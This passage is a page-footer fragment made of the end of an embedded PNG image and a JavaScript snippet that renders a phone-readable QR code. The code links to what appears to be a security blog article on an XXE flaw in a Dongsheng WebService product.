wr5Zn4V+sT3WB7eBtOnmr7mBeyCvufflrv8DAAD///eQ5GMAAAAGSURBVAMAh/6wwugZthIAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/dongsheng-Webservice-DsWebService-XXE.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 